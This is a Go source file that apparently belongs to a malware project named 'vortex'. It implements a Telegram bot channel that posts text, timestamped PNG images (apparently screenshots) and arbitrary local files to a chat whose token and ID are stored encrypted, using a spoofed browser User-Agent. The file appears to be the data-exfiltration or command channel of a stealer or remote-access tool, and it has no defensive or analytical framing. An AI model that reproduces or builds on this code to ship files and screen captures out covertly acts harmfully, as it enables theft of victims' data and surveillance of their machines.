package telehandler

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"vortex/encrypt"
	"time"
)

const (
	TelegramUrlAPI string = "https://api.telegram.org/bot"
	UserAgent      string = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36"
)

var (
	Token  string
	ChatId string
)

type msgResponse struct {
	Ok          bool   `json:"ok"`
	Description string `json:"description"`
	Result      []messageResult
}

type messageResult struct {
	UpdateId int `json:"update_id"`
	Message  struct {
		Text      string `json:"text"`
		MessageId int    `json:"message_id"`
	}
}

func (msgState msgResponse) telegramPostRequest(body *bytes.Buffer, contentType string, apiArg string) ([]messageResult, error) {
	apiUrl := TelegramUrlAPI + encrypt.Decrypt(Token) + "/" + apiArg
	req, err := http.NewRequest(http.MethodPost, apiUrl, body)
	req.Header.Add("Content-Type", contentType)
	req.Header.Set("User-Agent", UserAgent)
	if err != nil {
		return nil, err
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	msgBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	json.Unmarshal(msgBody, &msgState)
	if !msgState.Ok {
		return nil, errors.New(msgState.Description)
	}

	return msgState.Result, nil
}

func telegramMultipart(formFile io.Reader, formFileName string, formFileType string, formFileCaption string) (*bytes.Buffer, string, error) {
	bodyBuffer := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuffer)

	chatWriter, _ := bodyWriter.CreateFormField("chat_id")
	chatWriter.Write([]byte(encrypt.Decrypt(ChatId)))

	captionWriter, _ := bodyWriter.CreateFormField("caption")
	captionWriter.Write([]byte(formFileCaption))

	fileWriter, _ := bodyWriter.CreateFormFile(formFileType, filepath.Base(formFileName))
	if _, err := io.Copy(fileWriter, formFile); err != nil {
		return nil, "", err
	}
	bodyWriter.Close()

	return bodyBuffer, bodyWriter.FormDataContentType(), nil
}

// Send Message to Telegram Channel bot
func SendMessage(msgTxt string) error {
	var msgResp msgResponse

	msgBody, _ := json.Marshal(map[string]string{
		"chat_id":    encrypt.Decrypt(ChatId),
		"text":       msgTxt,
		"parse_mode": "html",
	})

	if _, err := msgResp.telegramPostRequest(bytes.NewBuffer(msgBody), "application/json", "sendMessage"); err != nil {
		return err
	}

	return nil
}

// Send image file to telegram bot
func SendImage(imgBuffer *bytes.Buffer, imgCaption string) error {
	var msgResp msgResponse
	currentTime := time.Now()

	buf, contentType, err := telegramMultipart(imgBuffer, currentTime.Format("2006-01-02_15:04:05")+".png", "photo", imgCaption)
	if err != nil {
		return err
	}

	if _, err = msgResp.telegramPostRequest(buf, contentType, "sendPhoto"); err != nil {
		return err
	}

	return nil
}

// Upload file to telegram bot
func UploadFile(filePath string, fileCaption string) error {
	var msgResp msgResponse

	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	buf, contentType, err := telegramMultipart(file, file.Name(), "document", fileCaption)
	if err != nil {
		return err
	}

	if _, err = msgResp.telegramPostRequest(buf, contentType, "sendDocument"); err != nil {
		return err
	}

	return nil
}

// Send random joker stickers
func SendSticker() error {
	var msgResp msgResponse
	rand.NewSource(time.Now().UnixNano())

	jokerStickers := []string{
		"CAACAgIAAx0CbplhGQACC0Fj68jY9dPSb8dmpgABKk-fvP7WrvYAAgcfAAJBp_lLnUV6LEFDq7QuBA",
		"CAACAgIAAx0CbplhGQACC0Nj68kqdv3jgEdXYr3856lWUMtmKQAC0hcAAspuuUvi7WusHGBFYi4E",
		"CAACAgIAAx0CbplhGQACC0Rj68lPqAgLLlN_QXILdLL7gDw8NwACaR4AAvf_uEsxnZPxls8tOi4E",
		"CAACAgIAAx0CbplhGQACC0Zj68mYE-72da130zGz3A6FBZ9-5QACNSMAAiVR-Ev1IeFDGj7MoS4E",
		"CAACAgIAAx0CbplhGQACC0dj68mwGEmeBDZwnrzHORovdDzingACbhwAAqJw-UsAAYCnlBdNH64uBA",
		"CAACAgIAAx0CbplhGQACC0hj68nchZOsL2_kpHq84NkSc3ZcvgACryAAAlwu-Ev_QyGdsGIKTi4E",
		"CAACAgIAAx0CbplhGQACC0lj68nyH4TIhqEN4-mumlmbwJ50HwACWSEAAk7X8Es20yrQ5tLgWy4E",
		"CAACAgIAAx0CbplhGQACC0pj68oP_KPEwkL6vtwGPaJMHrNAzAACBR0AAu1--Eu1ElMSfgfaPC4E",
		"CAACAgIAAx0CbplhGQACC0tj68pYMrVb4QduZyg4PeOWyoAjDQACdh0AAmma-EvPBOnD4kaAmC4E",
	}

	msgBody, _ := json.Marshal(map[string]string{
		"chat_id": encrypt.Decrypt(ChatId),
		"sticker": jokerStickers[rand.Intn(len(jokerStickers))],
	})

	if _, err := msgResp.telegramPostRequest(bytes.NewBuffer(msgBody), "application/json", "sendSticker"); err != nil {
		return err
	}

	return nil
}
